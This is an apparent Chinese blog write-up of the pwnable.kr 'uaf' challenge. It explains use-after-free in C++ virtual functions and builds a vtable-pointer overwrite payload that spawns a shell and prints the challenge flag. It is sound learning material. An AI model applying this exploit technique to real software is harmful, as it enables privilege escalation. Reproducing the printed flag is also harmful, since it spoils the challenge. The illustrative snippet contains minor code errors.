---
title: uaf漏洞(use after free)在虚函数中的利用
date: 2018-10-14 18:45:56
tags: 漏洞
---
<strong><h1>漏洞原理</h1></strong>
   当应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。
这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是
主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc
调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。
dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。
也就是说当一个小的内存释放后 不会立马释放内核 去供给下次内存申请
详细介绍:https://www.cnblogs.com/alert123/p/4918041.html
<strong><h1>uaf在类虚函数中的使用</h1></strong>
要先了解一个类当创建虚函数时候 会自动创建一个虚函数表 该表存储该类的所有虚函数 当申请内存时候内存头部分会放这个虚函数表
```c++
class test
{
	private:
	int a;
	int b;
	public:
	virtual void play()
	{
		system("/bin/sh");
	}
	virtural void Rep()
	{
		printf("%s","you are good!");
	}
}
当申请内存的时候
  +------------+
  |     vptr   |
  +------------+
  |      a     |
  +------------+
  |      b     |
  +------------+
会头部分存虚函数指针存储虚函数表 也就是存储play函数和Rep函数的地址

当后面有类指针定义并且释放 然后再有相同类指针定义时会重新利用这个内存 
  +------------+
  |     vptr   |
  +------------+
  |      a     |
  +------------+
  |      b     |
  +------------+
  比如上图类的程序 当别人是让你调用Rep函数时 没想让你调用play函数 你可以通过
  修改vptr去修改vtale使调用函数指向play函数即可
 ```
 详细介绍:http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html
 <strong><h1>实验演示</h1></strong>
 这是一道pwnable.kr上的简单uaf题 地址:http://pwnable.kr/play.php
![Image test](https://i.loli.net/2018/10/14/5bc32376168a8.png)
我们进行ssh连接后会发现有三个文件
```bash
uaf@ubuntu:~$ ls -lh
total 24K
-rw-r----- 1 root uaf_pwn   22 Sep 25  2015 flag
-r-xr-sr-x 1 root uaf_pwn  16K Sep 25  2015 uaf
-rw-r--r-- 1 root root    1.4K Sep 25  2015 uaf.cpp
```
会发现我们没有权限去看flag 那肯定就要是利用那个uaf了 我们先看下uaf.cpp
```c++
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```
会发现这里面有虚函数 并且有类指针的利用和释放 那我们就想办法把调用函数换了 我们看下case2
```c++
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
```
会发现传入两个 一个是argv[1]和argv[2] 申请一个argv[1]大小的对象 并且从argv[2]文件中读取argv[1]大小给它

我们先把文件拖入IDA看下
![Image text](https://i.loli.net/2018/10/14/5bc3252b7663e.png)
会看到申请的这个内存是18h也就是24字节大小 后面继续看看 会发现调用函数时到了这里
![Iamge test](https://i.loli.net/2018/10/14/5bc326c25dbbb.png)
跟进去看下
![Image text](https://i.loli.net/2018/10/14/5bc32729d65c6.png)
会发现里面存着两个虚函数函数地址 其中give_shell在前面 introduce在后面 那这个0x401570地址应该就是虚函数表地址了 再看看这个函数是怎么调用的
![Image text](https://i.loli.net/2018/10/14/5bc328045a642.png)
在最上面看见man对象构造时 头部分的v3应该就是虚函数指针 该指针赋给子代的v13 一个int指针8字节(64位) 最后面函数调用时 v13+8就是调用introduce
```bash
pwndbg> x/5a 0x401570
0x401570 <_ZTV3Man+16>:	0x40117a <_ZN5Human10give_shellEv>	0x4012d2 <_ZN3Man9introduceEv>
0x401580 <_ZTV5Human>:	0x0	0x4015f0 <_ZTI5Human>
0x401590 <_ZTV5Human+16>:	0x40117a <_ZN5Human10give_shellEv>
```
那当然我们是就可以想办法改introduce的地址 当调用introduce时候去调用give_shell 那么我们就可以去改vtable的地址使他的地址减8 那么
相当于v13-8 当调用introduce函数时候 也就是v13-8+8刚好是vtable的首地址也就是give_shell vtable的地址是401570-8=401568
```bash
uaf@ubuntu:~$ python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" >/tmp/poc
```
把他写入tmp文件夹下 因为只有tmp文件夹可以运行
```bash
uaf@ubuntu:~$ python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" >/tmp/poc
uaf@ubuntu:~$ ./uaf 24 /tmp/poc
1. use
2. after
3. free
3
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
Segmentation fault
uaf@ubuntu:~$ ./uaf 24 /tmp/poc
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ ls
flag  uaf  uaf.cpp
$ cat flag
yay_f1ag_aft3r_pwning
```
解释:运行3 2 2 1是因为堆的分配是按照最后被释放的先被利用 所有第一次2是为了去利用最后释放的w 第二次是m